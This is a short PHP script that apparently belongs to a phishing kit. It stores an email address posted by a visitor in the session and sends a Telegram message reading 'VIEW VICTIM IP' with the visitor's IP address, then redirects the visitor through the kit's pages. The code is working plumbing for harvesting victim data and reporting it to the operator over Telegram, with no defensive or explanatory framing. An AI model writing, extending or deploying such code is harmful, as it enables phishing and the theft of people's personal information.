<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['semail'] = htmlspecialchars($_POST['email']);



if(empty($_SESSION['semail'])) {
    header("Location: ../index.php?page=error&userid={$id}&ue={$ue}");
}
else {

    $rezdata = "！ VIEW VICTIM IP:".$ip;
    sendTelegram($rezdata);
        

    header("Location: ../explain.php?userid={$id}&ue={$ue}");
}

}
// SMS Config END